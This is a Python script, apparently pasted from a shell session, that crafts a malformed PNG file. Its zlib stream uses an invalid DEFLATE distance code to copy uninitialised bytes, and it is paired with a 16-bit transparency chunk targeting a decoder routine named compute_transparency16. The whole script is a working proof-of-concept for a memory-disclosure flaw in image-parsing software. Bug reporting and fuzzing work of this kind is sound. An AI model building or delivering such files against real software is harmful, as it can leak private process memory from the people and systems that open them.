import struct, zlib, sys

class BitWriter:
    def __init__(self):
        self.bits = []
    def wint(self, value, n):          # n-bit integer, LSB-first (DEFLATE header fields)
        for i in range(n):
            self.bits.append((value >> i) & 1)
    def wcode(self, code, length):     # huffman code, MSB-first
        for i in range(length - 1, -1, -1):
            self.bits.append((code >> i) & 1)
    def data(self):
        out = bytearray()
        for i in range(0, len(self.bits), 8):
            b = 0
            for j, bit in enumerate(self.bits[i:i+8]):
                b |= bit << j
            out.append(b)
        return bytes(out)

bw = BitWriter()
# ---- deflate dynamic-huffman block ----
bw.wint(1, 1)    # BFINAL = 1
bw.wint(2, 2)    # BTYPE = 2 (dynamic huffman)
bw.wint(29, 5)   # HLIT  = 29 + 257 = 286 (symbols 0..285: literal 0, EOB 256, length 285)
bw.wint(30, 5)   # HDIST = 30 + 1  = 31  (symbols 0..30, incl. INVALID distance code 30)
bw.wint(15, 4)   # HCLEN = 15 + 4 = 19 code-length codes

cl_order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
cl_len   = {0:2, 1:2, 2:3, 17:3, 18:3}
for sym in cl_order:
    bw.wint(cl_len.get(sym, 0), 3)

# canonical code-length codes: 0->"00" 1->"01" 2->"100" 17->"101" 18->"110"
CL = {0:(0,2), 1:(1,2), 2:(4,3), 17:(5,3), 18:(6,3)}
def emit_cl(sym):
    code, n = CL[sym]
    bw.wcode(code, n)

# 317 code lengths (286 literal/length + 31 distance):
# 1 (literal 0), 255 zeros, 2 (EOB 256), 28 zeros, 2 (length 285), 30 zeros, 1 (dist 30)
emit_cl(1)                     # literal/length symbol 0 -> codelength 1 (code "0")
emit_cl(18); bw.wint(127, 7)   # 138 zeros
emit_cl(18); bw.wint(97, 7)    # 108 zeros  (246)
emit_cl(17); bw.wint(6, 3)     #  9 zeros   (255)
emit_cl(2)                     # symbol 256 (end-of-block) -> len 2 (code "10")
emit_cl(17); bw.wint(7, 3)     # 10 zeros  (257..266)
emit_cl(17); bw.wint(7, 3)     # 10 zeros  (267..276)
emit_cl(17); bw.wint(5, 3)     #  8 zeros  (277..284)
emit_cl(2)                     # symbol 285 (length 258) -> len 2 (code "11")
emit_cl(17); bw.wint(7, 3)     # 10 zeros  (dist 0..9)
emit_cl(17); bw.wint(7, 3)     # 10 zeros  (dist 10..19)
emit_cl(17); bw.wint(7, 3)     # 10 zeros  (dist 20..29)
emit_cl(1)                     # distance symbol 30 (INVALID) -> len 1 (code "0")

# data: literal 0 (initialized filter byte), match(len=258, dist=0 via INVALID code 30), EOB
bw.wcode(0, 1)     # literal 0
bw.wcode(3, 2)     # length symbol 285 -> len = 258, no extra bits
bw.wcode(0, 1)     # distance symbol 30 -> INVALID, dist = 0 -> copies uninitialised bytes
bw.wcode(2, 2)     # end of block

zdata = b'\x78\x01' + bw.data()
sys.stderr.write("zlib stream: %d bytes (%d bits)\n" % (len(zdata), len(bw.bits)))

def chunk(typ, data):
    return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", zlib.crc32(typ + data) & 0xffffffff)

png  = b'\x89PNG\r\n\x1a\n'
png += chunk(b'IHDR', struct.pack(">IIBBBBB", 1, 1, 16, 2, 0, 0, 0))   # 1x1, 16-bit RGB
png += chunk(b'tRNS', struct.pack(">HHH", 0x1111, 0x2222, 0x3333))     # 16-bit tRNS -> compute_transparency16, out_n==4
png += chunk(b'IDAT', zdata)
png += chunk(b'IEND', b'')

open(sys.argv[1], 'wb').write(png)
sys.stderr.write("wrote %s (%d bytes)\n" % (sys.argv[1], len(png)))
EOF
